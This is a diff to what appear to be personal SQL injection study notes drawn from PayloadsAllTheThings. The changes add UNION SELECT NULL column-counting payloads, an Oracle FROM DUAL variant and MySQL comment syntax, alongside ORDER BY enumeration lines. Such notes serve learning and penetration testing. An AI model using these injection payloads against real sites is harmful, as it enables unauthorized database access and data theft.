@@ -15,7 +15,7 @@ errror says it's mySQL database
 from PayloadAllThings
 
 ### MYSQL Comment
--- comment [Note the space after the double dash]
+-- - Note the space after the double dash
 /* MYSQL Comment */
 /*! MYSQL Special SQL */
 /*!32302 10*/ Comment for MYSQL version 3.23.02
@@ -30,6 +30,13 @@ from PayloadAllThings
 ...
 1' order by 7; -- -- ok
 1' order by 8; -- -- error -> 7 columns available
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+#using NULL is benficial if it is not certain if data types in columns match
+
 ```
 Other faster methods (if error messages are enabled):
 
@@ -38,6 +45,11 @@ Other faster methods (if error messages are enabled):
 
 1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100; -- --
 
+```
+* Note: for oracle add FROM DUAL like so:
+
+```
+' UNION SELECT NULL FROM DUAL--
 ```
 
 2. identify vulnerable columns
